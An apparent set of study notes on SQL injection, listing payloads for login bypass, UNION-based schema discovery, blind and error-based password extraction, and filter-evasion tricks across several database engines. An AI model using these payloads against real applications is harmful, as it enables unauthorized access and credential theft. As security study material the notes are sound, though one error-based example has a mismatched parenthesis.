# SQLI
>  SQL injection allows one to exploit vulnerabilities based on SQL queries, which can result in exposure or loss of sensitive data, as well as elevated permissions.

## Where can SQLi occur?
* Login forms
* Querying data from tables
* Filtering of data
* Session cookies

## Commenting

| Version                               | Commenting syntax                                 |
|---------------------------------------|---------------------------------------------------|
| Microsoft, Oracle, PostgreSQL, SQLite | `--` or `/**/`                                    |
| MySQL                                 | `#`, `-- ` or `/**/` (note the space after `-- `) |

## Basic SQLi
`' or 1=1; -- `
This is the simplest form of SQLi, allowing us to bypass login forms. However, no data can be extracted via this method.

---

## UNION-based SQLi
The UNION attack uses the UNION keyword in most SQL dialects to join 2 tables into 1 table. This allows us to exploit vulnerabilities where the table output is returned to us. 

> The number of columns in a UNION subquery must match the original query. 

### Identify number of columns
Since the number of columns must match, we need to find out the number of columns fetched from the original query. 

#### ORDER BY
`' ORDER BY x; -- `, where x is a positive integer.

The query should error out when x exceeds the number of columns in the query.

#### null
`' UNION SELECT null, ... ; -- `

We can also increment the number of columns selected systematically. This method is slightly slower as we can't automate it via Burp Intruder. 

### Identify columns that support string data types
`' UNION SELECT 'a', null; -- `

> The null data type is compatible with almost all data types.

Strings cannot be converted to integers. Sometimes the backend code tries to do so to our injection, causing it to fail. Thus, we need to identify which columns are operated on as strings.

We can do so by shifting the column with the string sequentially, replacing the rest with null.

### Too few columns!
Sometimes, we want to extract more columns than the injection allows. We can bypass this via concatenation.

| Version                  | Query          |
| ------------------------ | -------------- |
| MySQL, MSSQL, PostgreSQL | `CONCAT(a, b)` |
| sqlite, Oracle           | `a || b`       |

### Identify SQL version

| Version          | Query                          |
| ---------------- | ------------------------------ |
| Microsoft, MySQL | `SELECT @@version`             |
| Oracle           | `SELECT banner FROM v$version` |
| PostgreSQL       | `SELECT version()`             |
| sqlite           | `SELECT sqlite_version()`      |

### Get table/column names

| Version                  | Query                                                                                                                            |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------- |
| MySQL, MSSQL, PostgreSQL | `SELECT table_name FROM information_schema.tables`<br>`SELECT column_name FROM information_schema.columns WHERE table_name = %s` |
| sqlite                   | `SELECT name, sql FROM sqlite_master`                                                                                            |
| Oracle                   | `SELECT table_name from all_tables`<br>`SELECT column_name from all_tab_columns where table_name = %s`                           |

> In sqlite, the sql column gives us the query used to create the table.

---

## Blind SQLi

*Useful when the attack vector is a login form, but the goal is not to bypass the login.*
| Version | Query                                      |
| ------- | ------------------------------------------ |
| MySQL   | ` or substring(password, x, 1) = 'a'; -- ` |
| sqlite  | ` or substr(password, x, 1) = 'a'; -- `    |

Manually bruteforcing each character can take quite long. We can either use Burp Intruder to leak the values, or script a custom Python implementation if Burp Intruder can't do what we want. For Burp Intruder, we'll usually need to use Cluster Bomb with at least 3 payloads: 2 digits for x, and 1 alphanumeric + symbols for char.

### Blind SQLi in different table
To change the table queried, simply put a SELECT statement in place of the string.

`substr((select password from users where username = 'admin'), 1, 1) = 'a'; -- `

### Error-based SQLi
` union select case when substr(password, 1, 1) = 'a' then to_char(1/0) else 'a' end) = 'a'; -- `

| Version    | Query                                                                  |
| ---------- | ---------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM DUAL`       |
| sqlite     | `SELECT iif(1, load_extension(1), '')`                                 |
| MySQL      | `SELECT if(1, (select table_name from information_schema.tables), '')` |
| Microsoft  | `SELECT iif(1, 1/0, '')`                                               |
| PostgreSQL | `SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE '' END`            |

> In Oracle, all SELECT statements must have a FROM parameter.

If the character guessed is right, the database will return an error. This can allow us to differentiate between true/false queries.

---

## String-based SQLi

This type of SQLi works when you have 2 string-bound inputs, and quotes are banned.

*eg.* `SELECT id FROM users WHERE id = '%s' and pw = '%s'`

We exploit the backslash escape character (\) to escape the second quote in id. 

Then, the first quote in pw will close the string, and whatever's in pw will be directly executed.

*eg.* `SELECT id FROM users WHERE id = '\' and pw = ' or id = "admin" -- '`, where `id=\'` and `pw= or id = "admin" -- `

---

## Filter bypasses

### Order of Operations

Do note that order of operations applies to SQL WHERE clause too! For example, `WHERE name = 'hello' and id = 1 or id = 0` is equivalent to `WHERE (name = 'hello' and id = 1) or id = 0`. This is useful when you want to select a different row in the same column than one already selected; it will select both their row and your row.

### No spaces

If the application does not allow spaces, we can bypass this via `/**/`. For example, `'/**/or/**/1=1` is equivalent to `' or 1=1`

You can also achieve this via special url-encoded whitespaces like `%09 %0a %0b %0c %0d %a0`

### OR/AND blacklisted

Most databases support `|` or `||` as the OR bitwise operator and `&` or `&&` as the AND bitwise operator

In addition, `-` can work like a NOT operator in a condition, and `=` is also "overloaded" to be the AND operator (1=1 = true).

### = blacklisted

You can use LIKE, IN or NOT IN instead

- LIKE
	- WHERE pw LIKE '' (can use % wildcard as a replacement for substring)
- IN / NOT IN
	- WHERE substring(pw, 1, 1) IN ('a')

### SUBSTR blacklisted

**Alternatives to substr()**

* mid("abc", 1, 1) == "a"
* left("abc", 1) == "a"

---

## Stuff to take note of

* Certain databases seem to reject the use of ; in a statement. In most cases, the semicolon isn't important, so we should always attempt SQLi without the semicolon first.
